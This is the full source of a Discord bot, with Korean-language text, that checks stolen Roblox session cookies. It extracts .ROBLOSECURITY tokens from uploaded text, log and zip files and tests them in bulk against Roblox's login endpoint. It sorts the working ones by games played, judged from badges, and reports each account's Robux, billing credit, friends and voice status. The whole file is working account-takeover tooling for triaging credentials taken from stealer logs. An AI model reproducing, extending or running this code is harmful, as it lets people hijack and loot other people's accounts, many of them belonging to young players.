# -*- coding: utf-8 -*-
import os, re, io, asyncio, aiohttp, datetime as dt, random, zipfile
import discord
from discord.ext import commands
from discord import Interaction, TextStyle
from discord.ui import View, Modal, TextInput

# ========================
# 환경변수
# ========================
TOKEN = os.getenv("DISCORD_TOKEN")
GUILD_ID = os.getenv("GUILD_ID")  # 선택

# ========================
# 표시/동작 정책
# ========================
MENU_PUBLIC = True
RESULTS_EPHEMERAL = True           # 서버에서의 인터랙션 응답은 에페메럴
CHUNK_SIZE = 500                   # 청크 처리 크기(사실상 무제한)
CONCURRENCY_AUTH = 8               # 인증 동시성
CONCURRENCY_BADGE = 5              # 배지/판정 동시성
MAX_TOTAL = 0                      # 0이면 입력 상한 해제(사실상 무제한)

# ========================
# 전역 네트워크(지연 생성)
# ========================
AIOHTTP_TIMEOUT = aiohttp.ClientTimeout(total=25, sock_connect=5, sock_read=20)
TCP_CONN: aiohttp.TCPConnector | None = None  # 지연 생성으로 3.13 루프 오류 회피

def new_session(cookies=None):
    global TCP_CONN
    if TCP_CONN is None:
        TCP_CONN = aiohttp.TCPConnector(
            limit=0,
            limit_per_host=20,
            ttl_dns_cache=300,
            enable_cleanup_closed=True
        )
    return aiohttp.ClientSession(
        timeout=AIOHTTP_TIMEOUT,
        connector=TCP_CONN,
        cookies=cookies or {},
        headers={"Accept-Encoding": "gzip", "Connection": "keep-alive"}
    )

# ========================
# UI/공통
# ========================
EMO = {"ok":"✅","warn":"⚠️","err":"❌"}
COLOR_BLACK = discord.Color.from_rgb(0, 0, 0)

def make_embed(title: str | None = None, desc: str = "") -> discord.Embed:
    emb = discord.Embed(description=desc, color=COLOR_BLACK)
    if title:
        emb.title = title
    return emb

def main_menu_embed() -> discord.Embed:
    return discord.Embed(
        title="쿠키 체커",
        description="아래 버튼으로 기능을 선택해줘.",
        color=COLOR_BLACK
    )

async def send_result(inter: Interaction, *, embed: discord.Embed, view: discord.ui.View | None = None, files: list[discord.File] | None = None):
    if RESULTS_EPHEMERAL:
        if not inter.response.is_done():
            await inter.response.send_message(embed=embed, view=view, files=files, ephemeral=True)
        else:
            await inter.followup.send(embed=embed, view=view, files=files, ephemeral=True)
    else:
        if not inter.response.is_done():
            await inter.response.send_message(embed=embed, view=view, files=files)
        else:
            await inter.followup.send(embed=embed, view=view, files=files)

# ========================
# 게임 프리셋(고정)
# ========================
GAMES = {
    "그로우 어 가든": {"key":"grow_a_garden", "universeId":7436755782, "welcomeBadgeIds":[]},
    "입양하세요":    {"key":"adopt_me",      "universeId":383310974,  "welcomeBadgeIds":[]},
    "브레인롯":      {"key":"brainrot",      "universeId":7709344486, "welcomeBadgeIds":[]},
    "블록스피스":    {"key":"blox_fruits",   "universeId":994732206,  "welcomeBadgeIds":[]},
}

# ========================
# 파일/토큰 인식(강화)
# ========================
SUPPORTED_TEXT_EXT = {".txt", ".log", ".csv", ".json"}
SUPPORTED_ARCHIVE_EXT = {".zip"}

COOKIE_PATTERNS = [
    r"(_\|WARNING[^\s\"';]+)",                               # _|WARNING…
    r"(?i)\.?\s*ROBLOSECURITY\s*=\s*([^\s\"';]+)",           # .ROBLOSECURITY=값
    r"(?i)\"ROBLOSECURITY\"\s*:\s*\"([^\"]+)\"",             # "ROBLOSECURITY":"값"
    r"(?i)Cookie:\s*[^;]*ROBLOSECURITY\s*=\s*([^\s;]+)",     # 헤더형
]

def extract_cookie_variants(s: str):
    if not s:
        return None, None
    s = s.strip()

    m_w = re.search(r"(_\|WARNING[^\s;]+)", s)
    if m_w:
        token = m_w.group(1).strip()
        return token, token

    m_eq = re.search(r"(?i)\.?\s*ROBLOSECURITY\s*=\s*([^\s;]+)", s)
    if m_eq:
        val = m_eq.group(1).strip()
        out = val[val.find("_|WARNING"):] if "_|WARNING" in val else val
        return val, out

    if len(s) > 50 and " " not in s and "\n" not in s and "\t" not in s:
        if "_|WARNING" in s:
            token = s[s.find("_|WARNING"):]
            return token, token
        return s, s

    return None, None

def find_tokens_in_text(text: str):
    out, seen = [], set()
    for pat in COOKIE_PATTERNS:
        for m in re.finditer(pat, text):
            val = m.group(1).strip()
            auth = val[val.find("_|WARNING"):] if "_|WARNING" in val else val
            outv = auth if "_|WARNING" in val else val
            if auth not in seen:
                seen.add(auth)
                out.append((auth, outv))
    for line in text.splitlines():
        auth, outv = extract_cookie_variants(line)
        if auth and (auth, outv) not in out:
            out.append((auth, outv))
    return out

async def extract_texts_from_attachment(att: discord.Attachment):
    name = (att.filename or "file").lower()
    data = await att.read()
    texts = []

    def dec(b: bytes):
        try:
            return b.decode("utf-8")
        except:
            return b.decode("utf-8", errors="ignore")

    if any(name.endswith(ext) for ext in SUPPORTED_ARCHIVE_EXT):
        with zipfile.ZipFile(io.BytesIO(data)) as zf:
            for info in zf.infolist():
                if info.is_dir():
                    continue
                lname = info.filename.lower()
                if not any(lname.endswith(ext) for ext in SUPPORTED_TEXT_EXT):
                    continue
                if info.file_size > 10 * 1024 * 1024:
                    continue
                with zf.open(info, "r") as f:
                    texts.append(dec(f.read()))
        return texts or [dec(data)], "zip"

    return [dec(data)], "text"

def parse_cookies_blob(raw: str):
    return find_tokens_in_text(raw)

# ========================
# 네트워크/로직(속도 최적화)
# ========================
async def fetch_json_with_retry(session: aiohttp.ClientSession, method: str, url: str, **kw):
    tries = 0
    while True:
        tries += 1
        try:
            async with session.request(method, url, **kw) as r:
                if r.status == 429:
                    ra = r.headers.get("Retry-After")
                    wait = float(ra) if ra else min(2 ** tries, 10) + random.random()
                    await asyncio.sleep(wait)
                    if tries < 5:
                        continue
                if 500 <= r.status < 600 and tries < 4:
                    await asyncio.sleep(min(2 ** tries, 6) + random.random())
                    continue
                if r.status >= 400:
                    try:
                        data = await r.json()
                    except:
                        data = {"error": await r.text()}
                    return r.status, data
                return r.status, await r.json()
        except Exception as e:
            if tries >= 4:
                return 599, {"error": f"{type(e).__name__}: {e}"}
            await asyncio.sleep(min(2 ** tries, 5) + random.random())

async def check_cookie_once(cookie_value: str):
    try:
        async with new_session(cookies={'.ROBLOSECURITY': cookie_value}) as s:
            st, data = await fetch_json_with_retry(s, "GET", "https://users.roblox.com/v1/users/authenticated")
            if st == 200 and isinstance(data, dict) and data.get("id"):
                return True, None, int(data["id"]), data.get("name") or data.get("displayName")
            if st in (401, 403):
                return False, None, None, None
            return False, f"unexpected {st}", None, None
    except Exception as e:
        return False, f"{type(e).__name__}: {e}", None, None

async def bulk_authenticate(pairs):
    sem = asyncio.Semaphore(CONCURRENCY_AUTH)
    async def worker(auth):
        async with sem:
            return await check_cookie_once(auth)
    return await asyncio.gather(*[worker(auth) for auth, _ in pairs])

async def get_user_badges(user_id: int, session: aiohttp.ClientSession, limit: int = 100):
    out, cursor = [], None
    base = f"https://badges.roblox.com/v1/users/{user_id}/badges?limit=100&sortOrder=Desc"
    for _ in range((limit + 99) // 100):
        url = base + (f"&cursor={cursor}" if cursor else "")
        st, data = await fetch_json_with_retry(session, "GET", url)
        if st != 200:
            break
        out.extend(data.get("data", []))
        cursor = data.get("nextPageCursor")
        if not cursor or len(out) >= limit:
            break
    return out[:limit]

def badge_belongs_to_universe(badge: dict, uni_id: int):
    uni = badge.get("awardingUniverse")
    return bool(isinstance(uni, dict) and int(uni.get("id") or 0) == int(uni_id))

async def has_any_welcome_badge(user_id: int, welcome_ids: list[int], session: aiohttp.ClientSession):
    if not welcome_ids:
        return False
    ids = ",".join(str(b) for b in welcome_ids[:50])
    st, data = await fetch_json_with_retry(session, "GET", f"https://badges.roblox.com/v1/users/{user_id}/badges/awarded-dates?badgeIds={ids}")
    if st != 200:
        return False
    return any(item.get("awardedDate") for item in data.get("data", []))

async def get_played_games_for_user(user_id: int, auth_cookie: str):
    played = set()
    try:
        async with new_session(cookies={'.ROBLOSECURITY': auth_cookie}) as s:
            badges = await get_user_badges(user_id, s, limit=100)
            uni_by_key = {cfg["key"]: int(cfg["universeId"]) for _, cfg in GAMES.items() if cfg.get("universeId")}
            for b in badges:
                uni = b.get("awardingUniverse")
                if not isinstance(uni, dict):
                    continue
                uid = int(uni.get("id") or 0)
                for k, u in uni_by_key.items():
                    if u == uid:
                        played.add(k)
            return played
    except:
        return played

# ========================
# DM 처리(청크 분할 + 임베드 결과)
# ========================
def chunked(seq, n):
    for i in range(0, len(seq), n):
        yield seq[i:i+n]

async def handle_file_check_logic_dm(dm: discord.DMChannel, raw_text: str):
    pairs = parse_cookies_blob(raw_text)
    if not pairs:
        return await dm.send(embed=make_embed("⚠️ 쿠키 없음", "파일에서 쿠키를 찾지 못했어."))

    if MAX_TOTAL and len(pairs) > MAX_TOTAL:
        pairs = pairs[:MAX_TOTAL]

    total_cnt = len(pairs)
    done_cnt = 0
    chunk_idx = 0

    for part in chunked(pairs, CHUNK_SIZE):
        chunk_idx += 1
        await dm.trigger_typing()

        # 1) 인증
        auth_results = await bulk_authenticate(part)
        ok_entries = []
        for (auth, outv), res in zip(part, auth_results):
            ok, err, uid, uname = res
            if ok and uid:
                ok_entries.append((auth, outv, uid, uname))

        # 2) 게임 판정
        game_buckets: dict[str, list[str]] = {}
        if ok_entries:
            sem_badge = asyncio.Semaphore(CONCURRENCY_BADGE)
            async def one(item):
                auth, outv, uid, uname = item
                async with sem_badge:
                    keys = await get_played_games_for_user(uid, auth)
                    return outv, keys
            played_results = await asyncio.gather(*[one(it) for it in ok_entries])
            for outv, keys in played_results:
                for k in keys:
                    game_buckets.setdefault(k, []).append(outv)

        # 3) 파일 구성(작동되는 것만)
        files: list[discord.File] = []
        if ok_entries:
            buf_valid = io.BytesIO(("\n".join(outv for _, outv, _, _ in ok_entries)).encode("utf-8"))
            files.append(discord.File(buf_valid, filename=f"valid_cookies_part{chunk_idx}.txt"))

        fn_map = {
            "grow_a_garden": f"grow_a_garden_part{chunk_idx}.txt",
            "adopt_me":      f"adopt_me_part{chunk_idx}.txt",
            "brainrot":      f"brainrot_part{chunk_idx}.txt",
            "blox_fruits":   f"blox_fruits_part{chunk_idx}.txt",
        }
        key_to_display = {cfg["key"]: disp for disp, cfg in GAMES.items()}

        lines = []
        for k, fname in fn_map.items():
            lst = game_buckets.get(k, [])
            if lst:
                buf = io.BytesIO(("\n".join(lst)).encode("utf-8"))
                files.append(discord.File(buf, filename=fname))
            lines.append(f"- {key_to_display.get(k, k)}: {len(lst)}개")

        done_cnt += len(part)
        success = len(ok_entries)
        fail = len(part) - success
        desc = f"[{chunk_idx}] 처리 청크: {len(part)}개\n" + ("\n".join(lines) if lines else "게임별 분류 결과 없음")

        emb = make_embed(
            title=f"{EMO['ok']} 파일 검증 결과(청크 {chunk_idx})" if success else f"{EMO['err']} 파일 검증 결과(청크 {chunk_idx})",
            desc=desc
        )
        emb.add_field(name="총 개수(누적/전체)", value=f"{done_cnt} / {total_cnt}", inline=True)
        emb.add_field(name="로그인 성공(이번 청크)", value=str(success), inline=True)
        emb.add_field(name="로그인 실패(이번 청크)", value=str(fail), inline=True)

        await dm.send(embed=emb, files=files or None)

# ========================
# 모달/뷰(모든 안내 임베드)
# ========================
class CookieModal(Modal, title="쿠키 검증"):
    cookie = TextInput(
        label=".ROBLOSECURITY 쿠키(여러 개 가능)",
        placeholder="한 줄에 하나씩 (._ROBLOSECURITY=… / _|WARNING… / \"ROBLOSECURITY\":\"…\")",
        style=TextStyle.paragraph,
        required=True,
        max_length=8000
    )
    async def on_submit(self, inter: Interaction):
        await inter.response.defer(ephemeral=RESULTS_EPHEMERAL)
        pairs = parse_cookies_blob(str(self.cookie))
        if not pairs:
            return await send_result(inter, embed=make_embed("⚠️ 입력 필요", "쿠키가 비어있어."))
        auth_results = await bulk_authenticate(pairs)
        ok_cnt = sum(1 for (_, _), r in zip(pairs, auth_results) if r[0] and r[2])
        fail_cnt = len(pairs) - ok_cnt
        emb = make_embed(
            title=f"{EMO['ok']} 쿠키 검증 결과" if ok_cnt else f"{EMO['err']} 쿠키 검증 결과",
            desc="빠른 요약(파일 첨부 없음)"
        )
        emb.add_field(name="총 개수", value=str(len(pairs)), inline=True)
        emb.add_field(name="로그인 성공", value=str(ok_cnt), inline=True)
        emb.add_field(name="로그인 실패", value=str(fail_cnt), inline=True)
        await send_result(inter, embed=emb)

class TotalCheckModal(Modal, title="전체 계정 정보 조회"):
    cookie = TextInput(label="로블록스 쿠키", style=TextStyle.short)
    async def on_submit(self, inter: Interaction):
        await inter.response.defer(ephemeral=RESULTS_EPHEMERAL)
        try:
            async with new_session(cookies={'.ROBLOSECURITY': self.cookie.value}) as s:
                st, data = await fetch_json_with_retry(s, "GET", "https://users.roblox.com/v1/users/authenticated")
                if st != 200 or not data.get("id"):
                    return await send_result(inter, embed=make_embed("❌ 유효하지 않은 쿠키", "로그인 실패"))
                user_id = data["id"]

                async def fj(url: str):
                    st, d = await fetch_json_with_retry(s, "GET", url)
                    return d

                robux, credit, settings, friends, voice, thumb = await asyncio.gather(
                    fj(f'https://economy.roblox.com/v1/users/{user_id}/currency'),
                    fj('https://billing.roblox.com/v1/credit'),
                    fj('https://www.roblox.com/my/settings/json'),
                    fj('https://friends.roblox.com/v1/my/friends/count'),
                    fj('https://voice.roblox.com/v1/settings'),
                    fj(f'https://thumbnails.roblox.com/v1/users/avatar-headshot?size=48x48&format=png&userIds={user_id}')
                )

                emb = make_embed()
                emb.set_author(name=f"{EMO['ok']} 전체 계정 정보")
                emb.set_thumbnail(url=(thumb.get('data', [{}])[0].get('imageUrl') or discord.Embed.Empty))
                emb.add_field(name="로벅스", value=f"{robux.get('robux', 0)} R$", inline=True)
                emb.add_field(name="크레딧", value=f"{credit.get('balance', 0)} {credit.get('currencyCode', '')}", inline=True)
                emb.add_field(name="닉네임", value=str(settings.get('Name')), inline=True)
                emb.add_field(name="친구 수", value=str(friends.get('count', 0)), inline=True)
                emb.add_field(name="음성 인증", value=str(voice.get('isVerifiedForVoice', False)), inline=True)

                await send_result(inter, embed=emb)
        except Exception as e:
            await send_result(inter, embed=make_embed("❌ 요청 실패", f"{type(e).__name__}: {e}"))

class DMFilePromptView(discord.ui.View):
    def __init__(self, bot: commands.Bot):
        super().__init__(timeout=120)
        self.bot = bot
        self.busy = False

    @discord.ui.button(label="파일검증(DM으로 진행)", style=discord.ButtonStyle.primary, custom_id="file_dm_btn")
    async def dm_btn(self, inter: Interaction, button: discord.ui.Button):
        if self.busy:
            return await inter.response.send_message(embed=make_embed("안내", "이미 진행 중이야. DM 확인해줘!"), ephemeral=True)
        self.busy = True

        # 1) DM 열기
        try:
            dm = await inter.user.create_dm()
        except Exception as e:
            self.busy = False
            return await inter.response.send_message(embed=make_embed("❌ DM 불가", f"DM 허용을 켜줘! ({e})"), ephemeral=True)

        # 2) 서버 쪽 즉시 응답(임베드)
        await inter.response.send_message(embed=make_embed("DM 전송", "DM으로 안내를 보냈어. 거기서 파일 올려줘!"), ephemeral=True)

        # 3) DM 안내(임베드)
        await dm.send(embed=make_embed(
            title="파일 검증 시작",
            desc="여기에 파일을 올려줘.\n- 지원: txt / log / csv / json / zip\n- 인식: _|WARNING…, .ROBLOSECURITY=…, \"ROBLOSECURITY\":\"…\"\n- 제한: 2분 내 업로드"
        ))

        # 4) DM에서 업로드 대기
        def check_msg(m: discord.Message):
            return (not m.author.bot) and (m.author.id == inter.user.id) and (m.channel.id == dm.id) and (len(m.attachments) > 0)

        try:
            msg: discord.Message = await self.bot.wait_for("message", check=check_msg, timeout=120)
        except asyncio.TimeoutError:
            self.busy = False
            return await dm.send(embed=make_embed("⚠️ 시간 초과", "다시 서버에서 [파일검증] 눌러 시작해줘."))

        att = msg.attachments[0]
        await dm.send(embed=make_embed("진행 중", "파일을 받았어. 검증을 시작할게."))

        # 5) 처리 시작(청크 전송)
        try:
            texts, _ = await extract_texts_from_attachment(att)
            combined = "\n\n".join(texts)
            await handle_file_check_logic_dm(dm, combined)
        except Exception as e:
            await dm.send(embed=make_embed("❌ 처리 실패", f"{type(e).__name__}: {e}"))
        finally:
            self.busy = False

class CheckView(View):
    def __init__(self, bot: commands.Bot):
        super().__init__(timeout=None)
        self.bot = bot

    @discord.ui.button(label="쿠키검증", style=discord.ButtonStyle.secondary, custom_id="cookie_check_btn")
    async def b1(self, inter: Interaction, button: discord.ui.Button):
        await inter.response.send_modal(CookieModal())

    @discord.ui.button(label="전체조회", style=discord.ButtonStyle.secondary, custom_id="total_check_btn")
    async def b2(self, inter: Interaction, button: discord.ui.Button):
        await inter.response.send_modal(TotalCheckModal())

    @discord.ui.button(label="파일검증", style=discord.ButtonStyle.secondary, custom_id="file_check_btn")
    async def b3(self, inter: Interaction, button: discord.ui.Button):
        emb = make_embed(
            title="파일 검증(DM 전용)",
            desc="아래 버튼을 누르면 너랑 나만 보는 DM에서 파일을 받을게."
        )
        view = DMFilePromptView(inter.client)
        await inter.response.send_message(embed=emb, view=view, ephemeral=True)

# ========================
# 봇 본체
# ========================
class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True  # DM 이벤트 안정 수신
        super().__init__(command_prefix=".", intents=intents)

    async def setup_hook(self):
        try:
            if GUILD_ID:
                gid = int(GUILD_ID)
                await self.tree.sync(guild=discord.Object(id=gid))
            else:
                await self.tree.sync()
        except Exception as e:
            print("[SYNC] 실패:", e)

bot = MyBot()

@bot.event
async def on_ready():
    try:
        bot.add_view(CheckView(bot))  # persistent view
        print("[VIEW] persistent CheckView 등록 완료")
    except Exception as e:
        print("[VIEW] 등록 실패:", e)
    print(f"{dt.datetime.now(dt.timezone.utc).strftime('%Y-%m-%d %H:%M:%S')} UTC → 로그인: {bot.user}")
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="Cookie Checker"))

# ========================
# 메뉴(공개)
# ========================
@bot.tree.command(name="체킹", description="로블록스 쿠키 및 정보 체킹 메뉴")
async def check(inter: Interaction):
    if MENU_PUBLIC:
        await inter.response.send_message(embed=main_menu_embed(), view=CheckView(bot))
    else:
        await inter.response.send_message(embed=main_menu_embed(), view=CheckView(bot), ephemeral=True)

# ========================
# 슬래시: 파일검증(바로 DM으로 안내)
# ========================
@bot.tree.command(name="파일검증", description="DM으로 파일을 받아 일괄 검증합니다")
async def file_check(inter: Interaction):
    emb = make_embed("DM 안내", "DM으로 보낼게. DM에서 파일 올려줘!")
    await inter.response.send_message(embed=emb, ephemeral=True)
    try:
        dm = await inter.user.create_dm()
        await dm.send(embed=make_embed(
            title="파일 검증(여기 DM에 업로드)",
            desc="txt/log/csv/json/zip 지원. _|WARNING…, .ROBLOSECURITY=…, \"ROBLOSECURITY\":\"…\" 전부 인식해.\n2분 내에 파일 올려줘."
        ))
    except Exception as e:
        await inter.followup.send(embed=make_embed("❌ DM 실패", f"DM 허용을 켜줘! ({e})"), ephemeral=True)

if __name__ == "__main__":
    if not TOKEN:
        raise RuntimeError("환경변수 DISCORD_TOKEN 이 설정되지 않았습니다.")
    bot.run(TOKEN)
